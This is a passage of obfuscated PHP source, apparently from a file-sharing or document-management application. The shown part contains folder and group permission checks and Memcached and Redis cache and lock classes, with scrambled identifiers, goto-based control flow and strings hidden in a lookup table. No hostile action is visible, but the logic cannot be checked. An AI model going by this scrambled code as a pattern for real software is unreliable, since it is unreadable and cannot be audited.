$Fó—ë—Ü‰[2258]; goto FèãùáßÍì; C½óÑ‹ˆ•: } public function authDeepCheck($bñÚ¤¦Ü¢) { goto c ­‚ƒæÆ¨; aÃõÎ”³Ù–: $a‘ªœ¸êªï = $CïÙ…—Î­á ? $CïÙ…—Î­á[0] : $bñÚ¤¦Ü¢; return array($D»ˆ×ÃƒáË[377] => -1, $D»ˆ×ÃƒáË[418] => array($D»ˆ×ÃƒáË[385] => $D»ˆ×ÃƒáË[1030], $D»ˆ×ÃƒáË[2111] => $D»ˆ×ÃƒáË[468], $D»ˆ×ÃƒáË[386] => LNG($D»ˆ×ÃƒáË[2261]), $D»ˆ×ÃƒáË[2123] => $D»ˆ×ÃƒáË[2262]), $D»ˆ×ÃƒáË[2263] => array($D»ˆ×ÃƒáË[388] => $D»ˆ×ÃƒáË[2264], $D»ˆ×ÃƒáË[75] => $a‘ªœ¸êªï)); goto f‘âÊºÖ©£; c ­‚ƒæÆ¨: $D»ˆ×ÃƒáË =& $_SERVER[¼€¼ˆ¦‚¡]; if (_get($GLOBALS, $D»ˆ×ÃƒáË[457])) { return !1; } $a Ä‘‰¦† = $this->makeAuthDeep(); goto eßöÂ‹ö¢ø; eßöÂ‹ö¢ø: if (!in_array($bñÚ¤¦Ü¢, $a Ä‘‰¦†[$D»ˆ×ÃƒáË[2259]])) { return !1; } $CïÙ…—Î­á = array(); foreach ($a Ä‘‰¦†[$D»ˆ×ÃƒáË[2260]] as $Dğ£ŞòñöÎ => $d¼É­ƒŞÌÌ) { if (!in_array($bñÚ¤¦Ü¢, $d¼É­ƒŞÌÌ)) { continue; } $CïÙ…—Î­á[] = $Dğ£ŞòñöÎ; } goto aÃõÎ”³Ù–; f‘âÊºÖ©£: } protected function makeAuthDeep() { goto B±Š×±µ…Ñ; f‰Ø§ˆäŞ‘: $eáß¤Äô‰ = Model($F¾Û¬´Šóñ[1117]); $aä°À‰Û¦ = Model($F¾Û¬´Šóñ[458]); $fäóîÙ…«Š = array(); goto f š÷Û¥; B±Š×±µ…Ñ: $F¾Û¬´Šóñ =& $_SERVER[¼€¼ˆ¦‚¡]; static $E‹ğ¡õø­œ = false; if ($E‹ğ¡õø­œ) { return $E‹ğ¡õø­œ; } goto aÊÑæÊŠ¸¹; C²¯ä÷á: $B‹©‰ÉªŸ = array_to_keyvalue($e–Œ¶ƒ­Í•, $F¾Û¬´Šóñ[33], $F¾Û¬´Šóñ[369]); $F‚÷ƒÆ© = array(); $F¢—çƒ¾¿Œ = $b®“Şšßİª; goto f‰Ø§ˆäŞ‘; f¨ä´æˆ¼: if ($b®“Şšßİª) { $fë÷äÑ¹» = array(array($F¾Û¬´Šóñ[371] => SourceModel::TYPE_USER, $F¾Û¬´Šóñ[456] => USER_ID), array($F¾Û¬´Šóñ[371] => SourceModel::TYPE_GROUP, $F¾Û¬´Šóñ[456] => array($F¾Û¬´Šóñ[384], $b®“Şšßİª)), $F¾Û¬´Šóñ[913] => $F¾Û¬´Šóñ[2187]); } if ($EƒÃ³èæÔ‘) { $fë÷äÑ¹» = array($fë÷äÑ¹», $F¾Û¬´Šóñ[2236] => array($F¾Û¬´Šóñ[2266], $EƒÃ³èæÔ‘)); } $e–Œ¶ƒ­Í• = $this->field($F¾Û¬´Šóñ[2267])->where($fë÷äÑ¹»)->select(); goto C²¯ä÷á; A¢òç ¯„Â: if ($B‹©‰ÉªŸ) { $a†ªÓ¦Çè = $eáß¤Äô‰->where(array($F¾Û¬´Šóñ[369] => array($F¾Û¬´Šóñ[384], $B‹©‰ÉªŸ)))->select(); foreach ($a†ªÓ¦Çè as $B‚Š÷ÓšŠ—) { $d¢é®»ïÇİ = $eáß¤Äô‰->parentLevelArray($B‚Š÷ÓšŠ—[$F¾Û¬´Šóñ[459]]); $F‚÷ƒÆ© = array_merge($F‚÷ƒÆ©, $d¢é®»ïÇİ); $F¢—çƒ¾¿Œ[] = $B‚Š÷ÓšŠ—[$F¾Û¬´Šóñ[456]]; $fäóîÙ…«Š[$B‚Š÷ÓšŠ—[$F¾Û¬´Šóñ[369]]] = $d¢é®»ïÇİ; $F‚òÕÎÍ“[$B‚Š÷ÓšŠ—[$F¾Û¬´Šóñ[369]]] = $B‚Š÷ÓšŠ—[$F¾Û¬´Šóñ[456]]; } } $F¢—çƒ¾¿Œ = array_values(array_unique($F¢—çƒ¾¿Œ)); $cö¶×¹è‘ = $F¢—çƒ¾¿Œ; goto Cè¬Ò—ëß¬; Cè¬Ò—ëß¬: foreach ($cö¶×¹è‘ as $dÖ‹†¡­…“) { $A²æˆÆÅŞ° = $aä°À‰Û¦->getInfo($dÖ‹†¡­…“); $d¢é®»ïÇİ = $eáß¤Äô‰->parentLevelArray($A²æˆÆÅŞ°[$F¾Û¬´Šóñ[459]]); $F¢—çƒ¾¿Œ = array_merge($F¢—çƒ¾¿Œ, $d¢é®»ïÇİ); } $F¢—çƒ¾¿Œ = array_values(array_unique($F¢—çƒ¾¿Œ)); foreach ($F¢—çƒ¾¿Œ as $dÖ‹†¡­…“) { $A²æˆÆÅŞ° = $aä°À‰Û¦->getInfo($dÖ‹†¡­…“); $F‚÷ƒÆ©[] = $A²æˆÆÅŞ°[$F¾Û¬´Šóñ[391]][$F¾Û¬´Šóñ[369]]; $f‹‹Êˆ°ä…[$dÖ‹†¡­…“] = $A²æˆÆÅŞ°[$F¾Û¬´Šóñ[391]][$F¾Û¬´Šóñ[369]]; $BŒÔ¾¸Çí[$dÖ‹†¡­…“] = $eáß¤Äô‰->parentLevelArray($A²æˆÆÅŞ°[$F¾Û¬´Šóñ[459]]); } goto C™å·òÔñ; C™å·òÔñ: foreach ($fäóîÙ…«Š as $A§‘¼‚æË => $A¶’Éè›ñ‚) { $C¼’ŒŸª‚· = $F‚òÕÎÍ“[$A§‘¼‚æË]; if (!$C¼’ŒŸª‚· || !$f‹‹Êˆ°ä…[$C¼’ŒŸª‚·]) { continue; } $Fôƒ’îè©å = array(); foreach ($BŒÔ¾¸Çí[$C¼’ŒŸª‚·] as $dÖ‹†¡­…“) { $Fôƒ’îè©å[] = $f‹‹Êˆ°ä…[$dÖ‹†¡­…“]; } $fäóîÙ…«Š[$A§‘¼‚æË] = array_merge($Fôƒ’îè©å, $A¶’Éè›ñ‚); } $F‚÷ƒÆ© = array_values(array_unique($F‚÷ƒÆ©)); $E‹ğ¡õø­œ = array($F¾Û¬´Šóñ[2259] => $F‚÷ƒÆ©, $F¾Û¬´Šóñ[2260] => $fäóîÙ…«Š); goto aéØùÕš’ ; f š÷Û¥: $F‚òÕÎÍ“ = array(); $f‹‹Êˆ°ä… = array(); $BŒÔ¾¸Çí = array(); goto A¢òç ¯„Â; aÊÑæÊŠ¸¹: $dº‰ßÖä = Model($F¾Û¬´Šóñ[2265])->listData(); $EƒÃ³èæÔ‘ = array(); foreach ($dº‰ßÖä as $a¶¤Ü†õ¥İ) { if ($a¶¤Ü†õ¥İ[$F¾Û¬´Šóñ[376]] == 0 && $a¶¤Ü†õ¥İ[$F¾Û¬´Šóñ[2125]] == $F¾Û¬´Šóñ[83]) { $EƒÃ³èæÔ‘[] = $a¶¤Ü†õ¥İ[$F¾Û¬´Šóñ[367]]; } } goto fÃíàáŠ´; fÃíàáŠ´: $b®“Şšßİª = Session::get($F¾Û¬´Šóñ[2220]); $b®“Şšßİª = array_to_keyvalue($b®“Şšßİª, $F¾Û¬´Šóñ[33], $F¾Û¬´Šóñ[2105]); $fë÷äÑ¹» = array($F¾Û¬´Šóñ[371] => SourceModel::TYPE_USER, $F¾Û¬´Šóñ[456] => USER_ID); goto f¨ä´æˆ¼; aéØùÕš’ : return $E‹ğ¡õø­œ; goto d¼ùŠÔªŠƒ; d¼ùŠÔªŠƒ: } private function makeSourceAuth($b¦æóá¥‹†, $aó¨¸ªéâ¯) { goto EÕî„’ôˆ‹; bêëé‚É: $FŠ­ø»ø¢ = $FÙŒ»ÍçÉ­[83]; $CŸ˜‰²áßÇ = Model($FÙŒ»ÍçÉ­[1117])->parentLevelArray($b¦æóá¥‹†[$FÙŒ»ÍçÉ­[459]]); $CŸ˜‰²áßÇ = array_merge(array($b¦æóá¥‹†[$FÙŒ»ÍçÉ­[369]]), array_reverse($CŸ˜‰²áßÇ)); goto C÷¥—Ší±; e¹º¼ãƒ: $c—¢Ò¼±ö³ = !1; foreach ($CŸ˜‰²áßÇ as $EŒÈµ¥¨ŒÉ) { if (!isset($aó¨¸ªéâ¯[$EŒÈµ¥¨ŒÉ])) { continue; } $AÒƒ¾…ñ¨ª = $this->authMake($aó¨¸ªéâ¯[$EŒÈµ¥¨ŒÉ]); if ($AÒƒ¾…ñ¨ª[$FÙŒ»ÍçÉ­[418]]) { $c—¢Ò¼±ö³ = $AÒƒ¾…ñ¨ª; break; } } if (!$aÓŠ½‰Êæ®) { return $c—¢Ò¼±ö³; } goto Aİğ°§É½Æ; C¸åùˆ¾Ù: return $c—¢Ò¼±ö³; goto dË„·¯èøù; Aİğ°§É½Æ: if (!$c—¢Ò¼±ö³ && isset($fä©ä³öÅ[$aÏ¤ÇÔä¦])) { $e™Õ£Ë›® = $fä©ä³öÅ[$aÏ¤ÇÔä¦]; $fÉ¡Óƒˆ¬Ç = Model($FÙŒ»ÍçÉ­[458])->getInfo($aÏ¤ÇÔä¦); $c—¢Ò¼±ö³ = array($FÙŒ»ÍçÉ­[2268] => intval($e™Õ£Ë›®[$FÙŒ»ÍçÉ­[376]][$FÙŒ»ÍçÉ­[376]]), $FÙŒ»ÍçÉ­[2269] => $e™Õ£Ë›®[$FÙŒ»ÍçÉ­[376]], $FÙŒ»ÍçÉ­[2263] => array($FÙŒ»ÍçÉ­[388] => $FÙŒ»ÍçÉ­[2273], $FÙŒ»ÍçÉ­[75] => $fÉ¡Óƒˆ¬Ç[$FÙŒ»ÍçÉ­[391]][$FÙŒ»ÍçÉ­[369]], $FÙŒ»ÍçÉ­[2272] => $fÉ¡Óƒˆ¬Ç[$FÙŒ»ÍçÉ­[463]])); } if (!$c—¢Ò¼±ö³) { $fÉ¡Óƒˆ¬Ç = Model($FÙŒ»ÍçÉ­[458])->getInfo($aÏ¤ÇÔä¦); $C›èÁ“Ş°î = explode($FÙŒ»ÍçÉ­[47], trim($fÉ¡Óƒˆ¬Ç[$FÙŒ»ÍçÉ­[459]], $FÙŒ»ÍçÉ­[47])); foreach ($C›èÁ“Ş°î as $E÷³ó„ÃÂ) { if ($E÷³ó„ÃÂ == $FÙŒ»ÍçÉ­[468] || $E÷³ó„ÃÂ == $FŠ­ø»ø¢) { continue; } if (!isset($fä©ä³öÅ[$E÷³ó„ÃÂ])) { continue; } $e™Õ£Ë›® = $fä©ä³öÅ[$E÷³ó„ÃÂ]; $c—¢Ò¼±ö³ = array($FÙŒ»ÍçÉ­[2268] => intval($e™Õ£Ë›®[$FÙŒ»ÍçÉ­[376]][$FÙŒ»ÍçÉ­[376]]), $FÙŒ»ÍçÉ­[2269] => $e™Õ£Ë›®[$FÙŒ»ÍçÉ­[376]], $FÙŒ»ÍçÉ­[2263] => array($FÙŒ»ÍçÉ­[388] => $FÙŒ»ÍçÉ­[2270], $FÙŒ»ÍçÉ­[2271] => $fÉ¡Óƒˆ¬Ç[$FÙŒ»ÍçÉ­[391]][$FÙŒ»ÍçÉ­[369]], $FÙŒ»ÍçÉ­[2272] => $fÉ¡Óƒˆ¬Ç[$FÙŒ»ÍçÉ­[463]])); break; } } if (!$c—¢Ò¼±ö³ || $c—¢Ò¼±ö³[$FÙŒ»ÍçÉ­[377]] <= 0) { $c›ÙÖ¡™°× = $this->authDeepCheck($b¦æóá¥‹†[$FÙŒ»ÍçÉ­[369]]); if ($c›ÙÖ¡™°×) { $c—¢Ò¼±ö³ = $c›ÙÖ¡™°×; } } goto C¸åùˆ¾Ù; C÷¥—Ší±: $aÏ¤ÇÔä¦ = $b¦æóá¥‹†[$FÙŒ»ÍçÉ­[456]]; $aÓŠ½‰Êæ® = $b¦æóá¥‹†[$FÙŒ»ÍçÉ­[371]] == SourceModel::TYPE_GROUP; if ($aÓŠ½‰Êæ® && isset($fä©ä³öÅ[$aÏ¤ÇÔä¦]) && !_get($GLOBALS, $FÙŒ»ÍçÉ­[457])) { $e™Õ£Ë›® = $fä©ä³öÅ[$aÏ¤ÇÔä¦]; if (Model($FÙŒ»ÍçÉ­[2255])->authCheckRoot($e™Õ£Ë›®[$FÙŒ»ÍçÉ­[376]][$FÙŒ»ÍçÉ­[376]])) { $fÉ¡Óƒˆ¬Ç = Model($FÙŒ»ÍçÉ­[458])->getInfo($aÏ¤ÇÔä¦); $c—¢Ò¼±ö³ = array($FÙŒ»ÍçÉ­[2268] => intval($e™Õ£Ë›®[$FÙŒ»ÍçÉ­[376]][$FÙŒ»ÍçÉ­[376]]), $FÙŒ»ÍçÉ­[2269] => $e™Õ£Ë›®[$FÙŒ»ÍçÉ­[376]], $FÙŒ»ÍçÉ­[2263] => array($FÙŒ»ÍçÉ­[388] => $FÙŒ»ÍçÉ­[2270], $FÙŒ»ÍçÉ­[2271] => $fÉ¡Óƒˆ¬Ç[$FÙŒ»ÍçÉ­[391]][$FÙŒ»ÍçÉ­[369]], $FÙŒ»ÍçÉ­[2272] => $fÉ¡Óƒˆ¬Ç[$FÙŒ»ÍçÉ­[463]])); return $c—¢Ò¼±ö³; } } goto e¹º¼ãƒ; EÕî„’ôˆ‹: $FÙŒ»ÍçÉ­ =& $_SERVER[¼€¼ˆ¦‚¡]; $fä©ä³öÅ = Session::get($FÙŒ»ÍçÉ­[2220]); $fä©ä³öÅ = array_to_keyvalue($fä©ä³öÅ, $FÙŒ»ÍçÉ­[2105]); goto bêëé‚É; dË„·¯èøù: } public function authOwnerApply($DµİÀã«ßÔ) { goto B¯öŒ´Œ; B¯öŒ´Œ: $e–ïíùŠÍ… =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($DµİÀã«ßÔ[$e–ïíùŠÍ…[376]]) || isset($DµİÀã«ßÔ[$e–ïíùŠÍ…[2274]]) && $DµİÀã«ßÔ[$e–ïíùŠÍ…[2274]]) { return $DµİÀã«ßÔ; } if (AuthModel::authCheckRoot($DµİÀã«ßÔ[$e–ïíùŠÍ…[376]][$e–ïíùŠÍ…[377]])) { return $DµİÀã«ßÔ; } goto fƒê¹Êšš‡; f­Èøšá¡‰: $aÎˆ§İŒ’Ô = array(); $BùòéºªÂÁ = array(); foreach ($d¥½ÒÈâ÷ as $a†Åï²É õ => $FŸÖ¸ß…À) { $Eš¹âš‡´Ø = $this->authFolderOwnerUser($FŸÖ¸ß…À); $aÎˆ§İŒ’Ô[$a†Åï²É õ] = $Eš¹âš‡´Ø; $BùòéºªÂÁ = array_merge($BùòéºªÂÁ, $Eš¹âš‡´Ø[$e–ïíùŠÍ…[535]]); if ($Eš¹âš‡´Ø[$e–ïíùŠÍ…[2275]]) { break; } } goto F™•Åª³; f˜ÜŸÇ™ôª: $D‹§³ÍšìŸ = array($e–ïíùŠÍ…[383] => array($e–ïíùŠÍ…[384], $BÁšô¿Ä–á)); $d¥½ÒÈâ÷ = $this->field($eÉ¡Á´¶œÏ)->where($D‹§³ÍšìŸ)->select(); $d¥½ÒÈâ÷ = array_to_keyvalue_group($d¥½ÒÈâ÷, $e–ïíùŠÍ…[369]); goto f­Èøšá¡‰; fƒê¹Êšš‡: $BÁšô¿Ä–á = Model($e–ïíùŠÍ…[1117])->parentLevelArray($DµİÀã«ßÔ[$e–ïíùŠÍ…[459]]); $BÁšô¿Ä–á = array_merge(array($DµİÀã«ßÔ[$e–ïíùŠÍ…[369]]), array_reverse($BÁšô¿Ä–á)); $eÉ¡Á´¶œÏ = $e–ïíùŠÍ…[2258]; goto f˜ÜŸÇ™ôª; eÉèË½‘ùÛ: $DµİÀã«ßÔ[$e–ïíùŠÍ…[376]][$e–ïíùŠÍ…[2276]] = Model($e–ïíùŠÍ…[474])->userListInfo($BùòéºªÂÁ); return $DµİÀã«ßÔ; goto cø§¥–°¯; F™•Åª³: if (count($BùòéºªÂÁ) == 0) { $BùòéºªÂÁ = $this->authFolderOwnerGroup($DµİÀã«ßÔ[$e–ïíùŠÍ…[456]]); } $BùòéºªÂÁ = array_unique($BùòéºªÂÁ); if (AuthModel::authCheckRoot($DµİÀã«ßÔ[$e–ïíùŠÍ…[376]][$e–ïíùŠÍ…[377]])) { $BùòéºªÂÁ[] = USER_ID; } goto eÉèË½‘ùÛ; cø§¥–°¯: } private function authFolderOwnerGroup($e®íöøĞœ½) { $CÜ‘˜–ßí¶ =& $_SERVER[¼€¼ˆ¦‚¡]; $d†ÕÜàöµ = Model($CÜ‘˜–ßí¶[2181])->where(array($CÜ‘˜–ßí¶[2105] => $e®íöøĞœ½))->select(); $C–‚ä†«›è = array(); if (!$d†ÕÜàöµ) { return $C–‚ä†«›è; } foreach ($d†ÕÜàöµ as $Bâ¡®Œø¡) { $dù¹ñØõÔ = $this->authInfo($Bâ¡®Œø¡); if (AuthModel::authCheckRoot($dù¹ñØõÔ[$CÜ‘˜–ßí¶[376]])) { $C–‚ä†«›è[] = $Bâ¡®Œø¡[$CÜ‘˜–ßí¶[1437]]; } } return $C–‚ä†«›è; } private function authFolderOwnerUser($D¹•çŸé‘¶) { $D³—â§ã…´ =& $_SERVER[¼€¼ˆ¦‚¡]; $B®–Ô—«Éí = array(); $Bå¸Ñ–äÉ¥ = !1; foreach ($D¹•çŸé‘¶ as $E¥±¬à¸‹Ã) { $D»¨Ö¡ÉÄ² = $this->authInfo($E¥±¬à¸‹Ã); if ($E¥±¬à¸‹Ã[$D³—â§ã…´[456]] == $D³—â§ã…´[468]) { $Bå¸Ñ–äÉ¥ = !0; } if ($E¥±¬à¸‹Ã[$D³—â§ã…´[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($D»¨Ö¡ÉÄ²[$D³—â§ã…´[376]])) { $B®–Ô—«Éí[] = $E¥±¬à¸‹Ã[$D³—â§ã…´[456]]; } } } return array($D³—â§ã…´[535] => $B®–Ô—«Éí, $D³—â§ã…´[2275] => $Bå¸Ñ–äÉ¥); } public function authMake($eÙ½®Ğ£ÅÊ) { goto E•ù¨ÀÄØˆ; bšØã·™ò: $c¬‹‘‡¤¿ = 0; $CÂ„®Œ’ = 0; $FƒË‚Œ›“Ç = 0; goto C÷à¯¹²æ; E•ù¨ÀÄØˆ: $cßæà˜È ” =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$eÙ½®Ğ£ÅÊ) { return array($cßæà˜È ”[377] => 0, $cßæà˜È ”[418] => !1); } $A§‚ÃÚ‡ä¨ = Session::get($cßæà˜È ”[2220]); goto BÓèò–È‰; BÓèò–È‰: $f¢ïÍ“ÂÒ‚ = array_to_keyvalue($A§‚ÃÚ‡ä¨, $cßæà˜È ”[33], $cßæà˜È ”[2105]); $c¹Ì„Ã·…Ñ = 0; $Eˆãƒéô›£ = 0; goto E‡õÒ…ÄÌã; C÷à¯¹²æ: $e…¯¦™¢›‡ = 0; $EòèìÆÖ–‰ = array($cßæà˜È ”[369] => 0); foreach ($eÙ½®Ğ£ÅÊ as $EòèìÆÖ–‰) { $d…°Âî«Ê = $this->authInfo($EòèìÆÖ–‰); $AÃİ±ìğ¿ì = $EòèìÆÖ–‰[$cßæà˜È ”[456]]; $aøõ”´“Ø« = intval($d…°Âî«Ê[$cßæà˜È ”[376]]); if ($EòèìÆÖ–‰[$cßæà˜È ”[371]] == SourceModel::TYPE_USER && $AÃİ±ìğ¿ì == USER_ID) { $CÂ„®Œ’ = !0; $d—ÑÔ¨­”ó = $d…°Âî«Ê; $c¹Ì„Ã·…Ñ = $aøõ”´“Ø«; } else { if ($EòèìÆÖ–‰[$cßæà˜È ”[371]] == SourceModel::TYPE_GROUP && in_array($AÃİ±ìğ¿ì, $f¢ïÍ“ÂÒ‚)) { $FƒË‚Œ›“Ç = !0; if ($aøõ”´“Ø« >= $Eˆãƒéô›£) { $Eˆãƒéô›£ = $aøõ”´“Ø«; $E¬õŒÈèˆ = $d…°Âî«Ê; } } else { if ($AÃİ±ìğ¿ì == $cßæà˜È ”[468]) { $e…¯¦™¢›‡ = !0; $c¬‹‘‡¤¿ = $d…°Âî«Ê; $AƒšÛ ˜˜’ = $aøõ”´“Ø«; } } } } goto cáÜôâØë; E‡õÒ…ÄÌã: $AƒšÛ ˜˜’ = 0; $d—ÑÔ¨­”ó = 0; $E¬õŒÈèˆ = 0; goto bšØã·™ò; cáÜôâØë: $A…©§ÄÊÖÚ = $CÂ„®Œ’ ? $c¹Ì„Ã·…Ñ : ($FƒË‚Œ›“Ç ? $Eˆãƒéô›£ : $AƒšÛ ˜˜’); $d…°Âî«Ê = $CÂ„®Œ’ ? $d—ÑÔ¨­”ó : ($FƒË‚Œ›“Ç ? $E¬õŒÈèˆ : $c¬‹‘‡¤¿); $dî™Š‚Ù—» = $CÂ„®Œ’ ? $cßæà˜È ”[2277] : ($FƒË‚Œ›“Ç ? $cßæà˜È ”[2278] : ($e…¯¦™¢›‡ ? $cßæà˜È ”[2279] : $cßæà˜È ”[361])); goto dòßÀ‡‡í; dòßÀ‡‡í: $e­‘½”” = array($cßæà˜È ”[2268] => intval($A…©§ÄÊÖÚ), $cßæà˜È ”[2269] => $d…°Âî«Ê, $cßæà˜È ”[2263] => array($cßæà˜È ”[388] => $dî™Š‚Ù—», $cßæà˜È ”[75] => $EòèìÆÖ–‰[$cßæà˜È ”[369]])); return $e­‘½””; goto d‰Œ’ëŸİ; d‰Œ’ëŸİ: } public function authTargetInfoMake($Eéˆ§ã¼‹â) { goto Cµˆß‚¤†; bšƒÍ¯Ó¢Š: return array($eÈœíö Ùç[2280] => $DºÛàŸÕÛ¾, $eÈœíö Ùç[2272] => $CøŠ‰„ßóõ); goto a˜†·»½©Ä; dÉµÙá×İ: foreach ($Eéˆ§ã¼‹â as $dÌŒÈœñ‡õ) { if ($dÌŒÈœñ‡õ[$eÈœíö Ùç[371]] == SourceModel::TYPE_USER) { $DºÛàŸÕÛ¾[] = intval($dÌŒÈœñ‡õ[$eÈœíö Ùç[456]]); } else { if ($dÌŒÈœñ‡õ[$eÈœíö Ùç[371]] == SourceModel::TYPE_GROUP) { $CøŠ‰„ßóõ[] = intval($dÌŒÈœñ‡õ[$eÈœíö Ùç[456]]); } } } if ($DºÛàŸÕÛ¾) { $DºÛàŸÕÛ¾ = Model($eÈœíö Ùç[474])->userListInfo($DºÛàŸÕÛ¾); } if ($CøŠ‰„ßóõ) { $A‡ˆµƒ¸ = array($eÈœíö Ùç[2179] => array($eÈœíö Ùç[384], $CøŠ‰„ßóõ)); $CøŠ‰„ßóõ = Model($eÈœíö Ùç[458])->field($eÈœíö Ùç[2192])->where($A‡ˆµƒ¸)->select(); $CøŠ‰„ßóõ = array_to_keyvalue($CøŠ‰„ßóõ, $eÈœíö Ùç[2105]); } goto bšƒÍ¯Ó¢Š; Cµˆß‚¤†: $eÈœíö Ùç =& $_SERVER[¼€¼ˆ¦‚¡]; $DºÛàŸÕÛ¾ = array(); $CøŠ‰„ßóõ = array(); goto dÉµÙá×İ; a˜†·»½©Ä: } private function authInfo($cÅ¨Ùè³èÔ) { $F˜¬İšƒŠ‹ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($cÅ¨Ùè³èÔ[$F˜¬İšƒŠ‹[2236]]) { $b½Âº­áÀ´ = Model($F˜¬İšƒŠ‹[2255])->listData($cÅ¨Ùè³èÔ[$F˜¬İšƒŠ‹[2236]]); if (!$b½Âº­áÀ´) { return !1; $a´Í™ß¼²‡ = Model($F˜¬İšƒŠ‹[2255])->listData(); $bÒ¬áóÜ›Ñ = array_filter_by_field($a´Í™ß¼²‡, $F˜¬İšƒŠ‹[376], $F˜¬İšƒŠ‹[468]); return $bÒ¬áóÜ›Ñ; } $EÀÈ’ãÔˆÔ = array_field_key($b½Âº­áÀ´, array($F˜¬İšƒŠ‹[367], $F˜¬İšƒŠ‹[28], $F˜¬İšƒŠ‹[376], $F˜¬İšƒŠ‹[2123], $F˜¬İšƒŠ‹[2126])); $EÀÈ’ãÔˆÔ[$F˜¬İšƒŠ‹[2281]] = $cÅ¨Ùè³èÔ; return $EÀÈ’ãÔˆÔ; } else { return array($F˜¬İšƒŠ‹[385] => 0, $F˜¬İšƒŠ‹[2111] => $cÅ¨Ùè³èÔ[$F˜¬İšƒŠ‹[2237]], $F˜¬İšƒŠ‹[386] => $F˜¬İšƒŠ‹[33], $F˜¬İšƒŠ‹[2123] => $F˜¬İšƒŠ‹[2282]); } } } goto EƒğîÄ¡Æ; E¿Ú“ùğ§µ: define($_SERVER[¼€¼ˆ¦‚¡][227], 2); define($_SERVER[¼€¼ˆ¦‚¡][228], 3); define($_SERVER[¼€¼ˆ¦‚¡][229], 1); goto E©£¸’ÀêÃ; bŠ‹×Ãù¯˜: class CacheLockMemcached { public function lock($aÕÛğÌğâÇ, $cÊê›Œ»Àİ = 0) { $cËçöÎ = Cache::init(); $d™ººÇé¢ = microtime(!0) + $cÊê›Œ»Àİ; while (microtime(!0) < $d™ººÇé¢) { $d‡ğÒ©‹‹¯ = $cËçöÎ->get($aÕÛğÌğâÇ); if (!$d‡ğÒ©‹‹¯ || $d‡ğÒ©‹‹¯ < microtime(!0)) { $a³†åããÍÕ = $cËçöÎ->handle->add($aÕÛğÌğâÇ, $d™ººÇé¢, $cÊê›Œ»Àİ); if ($a³†åããÍÕ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($aá”Ô‡‰¯´) { return Cache::init()->get($aá”Ô‡‰¯´); } public function unlock($dÈøŞšŞ¢¿) { return Cache::init()->remove($dÈøŞšŞ¢¿); } } class CacheLockDatabase { public function lock($e¡¿ÉÀÕ»Ã, $f÷ŸÍÎÃìÒ = 0) { $BÃ’„ÚÉ = Model($_SERVER[¼€¼ˆ¦‚¡][753]); $BãŸœÜ„ = microtime(!0) + $f÷ŸÍÎÃìÒ; while (microtime(!0) < $BãŸœÜ„) { $dÄ„ä…Ç = $BÃ’„ÚÉ->get($e¡¿ÉÀÕ»Ã); if (!$dÄ„ä…Ç || $dÄ„ä…Ç < microtime(!0)) { $cøÖËõÌ¸ = $BÃ’„ÚÉ->set($e¡¿ÉÀÕ»Ã, $BãŸœÜ„); if ($cøÖËõÌ¸) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Còßò«µô›) { return Model($_SERVER[¼€¼ˆ¦‚¡][753])->get($Còßò«µô›); } public function unlock($fŒ¡Äğƒ¯‚) { Model($_SERVER[¼€¼ˆ¦‚¡][753])->remove($fŒ¡Äğƒ¯‚); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($dŠÃË¾•—, $EâóÍ»”ØÉ) { $f¹ÍÍğ¤»İ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!class_exists($f¹ÍÍğ¤»İ[774])) { show_json($f¹ÍÍğ¤»İ[775], !1); } $this->cacheTime = $EâóÍ»”ØÉ; $this->handle = new Memcached(); if (is_array($dŠÃË¾•—[$f¹ÍÍğ¤»İ[776]]) && count($dŠÃË¾•—[$f¹ÍÍğ¤»İ[776]]) >= 1) { foreach ($dŠÃË¾•—[$f¹ÍÍğ¤»İ[776]] as $BÜ´¸é±™) { $FğÍÍÔªÓÛ = explode($f¹ÍÍğ¤»İ[4], $BÜ´¸é±™); $this->handle->addServer($FğÍÍÔªÓÛ[0], $FğÍÍÔªÓÛ[1]); } } else { $this->handle->addServer($dŠÃË¾•—[$f¹ÍÍğ¤»İ[169]], $dŠÃË¾•—[$f¹ÍÍğ¤»İ[170]]); } } public function set($fŒ²¦…¸óé, $F¿É¥ƒ­¹é, $dèÓ¥× = false) { $dèÓ¥× = $dèÓ¥× ? $dèÓ¥× : $this->cacheTime; return $this->handle->set($fŒ²¦…¸óé, $F¿É¥ƒ­¹é, $dèÓ¥×); } public function get($EÎ„¼“”ù‚) { return $this->handle->get($EÎ„¼“”ù‚); } public function remove($AÙÈ¶»ô­™) { return $this->handle->delete($AÙÈ¶»ô­™); } public function deleteAll() { return $this->handle->flush(); } } goto EÓŠ³‚İ¡„; EÓŠ³‚İ¡„: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($dµ•¼ã¬Ö´, $CÂòÉ¶…ê) { $báã¥İ­ÑÓ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!class_exists($báã¥İ­ÑÓ[777])) { show_json($báã¥İ­ÑÓ[778], !1); } $this->cacheTime = $CÂòÉ¶…ê; $b‚ÊÕˆÎ = isset($dµ•¼ã¬Ö´[$báã¥İ­ÑÓ[779]]) ? $dµ•¼ã¬Ö´[$báã¥İ­ÑÓ[779]] : 10; $c¥‰ïé±¿Ô = _get($dµ•¼ã¬Ö´, $báã¥İ­ÑÓ[776]); if ($c¥‰ïé±¿Ô && is_array($c¥‰ïé±¿Ô)) { $this->initCluster($dµ•¼ã¬Ö´, $b‚ÊÕˆÎ); } else { $this->handle = $this->init($dµ•¼ã¬Ö´, $b‚ÊÕˆÎ); } } private function init($bĞ÷†¢¥¥ø, $cÓ©òÂ©õ) { $EèŠÏ²äÓù =& $_SERVER[¼€¼ˆ¦‚¡]; $E‚ã²Øí—™ = new Redis(); $dÑ‚‡Æ×íö = isset($bĞ÷†¢¥¥ø[$EèŠÏ²äÓù[780]]) ? $bĞ÷†¢¥¥ø[$EèŠÏ²äÓù[780]] : !1; if ($dÑ‚‡Æ×íö) { $E‚ã²Øí—™->pconnect($bĞ÷†¢¥¥ø[$EèŠÏ²äÓù[169]], $bĞ÷†¢¥¥ø[$EèŠÏ²äÓù[170]], $cÓ©òÂ©õ); } else { $E‚ã²Øí—™->connect($bĞ÷†¢¥¥ø[$EèŠÏ²äÓù[169]], $bĞ÷†¢¥¥ø[$EèŠÏ²äÓù[170]], 